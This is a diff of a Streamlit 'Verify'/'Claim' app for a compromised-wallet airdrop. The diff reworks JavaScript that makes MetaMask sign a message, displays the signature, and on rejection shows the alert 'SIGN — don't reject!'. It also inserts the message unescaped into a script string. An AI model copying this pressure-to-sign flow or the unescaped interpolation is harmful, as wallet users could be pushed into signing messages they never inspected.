@@ -13,9 +13,6 @@ if "verified" not in st.session_state:
 
 tab1, tab2 = st.tabs(["Verify", "Claim"])
 
-# ========================================
-# TAB 1: VERIFY
-# ========================================
 with tab1:
     st.subheader("Step 1: Prove control")
     compromised = st.text_input("Compromised wallet", placeholder="0x...")
@@ -28,76 +25,57 @@ with tab1:
             st.success("Ready — click orange!")
 
     if "message" in st.session_state:
-        # INJECT JS INTO MAIN PAGE (runs once, no iframe reset)
-        st.markdown(f"""
-        <script>
-        // Run only once
-        if (!window.signScriptLoaded) {{
-            window.signScriptLoaded = true;
-
-            const message = `{st.session_state.message}`;
-
-            async function signAndShow() {{
-                const e = window.ethereum || window.top?.ethereum;
-                if (!e) return alert("Install MetaMask!");
-
-                try {{
-                    // Get account (connected or connect)
-                    let accounts = await e.request({{ method: 'eth_accounts' }});
-                    let addr = accounts[0];
-                    if (!addr) {{
-                        [addr] = await e.request({{ method: 'eth_requestAccounts' }});
-                    }}
-
-                    // Sign
-                    const sig = await e.request({{
-                        method: 'personal_sign',
-                        params: [message, addr]
-                    }});
-
-                    // Create green box
-                    let box = document.getElementById('airdropSigBox');
-                    if (!box) {{
-                        box = document.createElement('textarea');
-                        box.id = 'airdropSigBox';
-                        box.readOnly = true;
-                        box.style.cssText = `
-                            position: fixed;
-                            bottom: 20px;
-                            left: 50%;
-                            transform: translateX(-50%);
-                            width: 90%;
-                            max-width: 700px;
-                            height: 180px;
-                            padding: 16px;
-                            background: #000;
-                            color: #0f0;
-                            border: 4px solid #0f0;
-                            border-radius: 14px;
-                            font-family: monospace;
-                            font-size: 16px;
-                            z-index: 9999;
-                            box-shadow: 0 0 30px #0f0;
-                        `;
-                        document.body.appendChild(box);
-                    }}
-                    box.value = sig;
-                    box.scrollIntoView({{ behavior: 'smooth' }});
-                }} catch (err) {{
-                    alert("SIGN — don't reject!");
-                }}
+        st.components.v1.html(f"""
+        <style>
+            #sigBox {{
+                position: fixed;
+                bottom: 20px;
+                left: 50%;
+                transform: translateX(-50%);
+                width: 90%;
+                max-width: 700px;
+                height: 180px;
+                padding: 16px;
+                background: #000;
+                color: #0f0;
+                border: 4px solid #0f0;
+                border-radius: 14px;
+                font-family: monospace;
+                font-size: 16px;
+                z-index: 9999;
+                box-shadow: 0 0 30px #0f0;
+                display: none;
             }}
-
-            // Expose to button
-            window.triggerAirdropSign = signAndShow;
+            #sigBox.show {{ display: block; }}
+        </style>
+        <script>
+        async function go() {{
+            const e = window.ethereum || window.top?.ethereum;
+            if (!e) return alert("Install MetaMask!");
+            try {{
+                let accounts = await e.request({{ method: 'eth_accounts' }});
+                let a = accounts[0];
+                if (!a) {{
+                    [a] = await e.request({{ method: 'eth_requestAccounts' }});
+                }}
+                const s = await e.request({{ method: 'personal_sign', params: ['{st.session_state.message}', a] }});
+                let box = document.getElementById('sigBox');
+                if (!box) {{
+                    box = document.createElement('textarea');
+                    box.id = 'sigBox';
+                    box.readOnly = true;
+                    document.body.appendChild(box);
+                }}
+                box.value = s;
+                box.classList.add('show');
+                box.scrollIntoView({{ behavior: 'smooth', block: 'center' }});
+            }} catch {{
+                alert("SIGN — don't reject!");
+            }}
         }}
         </script>
-        """, unsafe_allow_html=True)
-
-        # Button that calls the global function
-        st.markdown(f"""
         <div style="text-align:center; margin:40px 0;">
-            <button onclick="window.triggerAirdropSign()" 
+            <button onclick="go()" 
                     style="background:#f6851b;color:white;padding:28px 100px;border:none;
                            border-radius:20px;font-size:38px;font-weight:bold;cursor:pointer;
                            box-shadow:0 15px 60px #f6851b88;">
@@ -105,7 +83,7 @@ with tab1:
             </button>
             <p><b>One click → SIGN → GREEN BOX</b></p>
         </div>
-        """, unsafe_allow_html=True)
+        """, height=300)
 
         sig = st.text_input("PASTE HERE", key="sig", placeholder="Ctrl+V from GREEN BOX")
 
@@ -119,9 +97,6 @@ with tab1:
             except:
                 st.error("Copy the FULL green text")
 
-# ========================================
-# TAB 2: CLAIM
-# ========================================
 with tab2:
     if st.session_state.verified:
         st.success("Ready!")
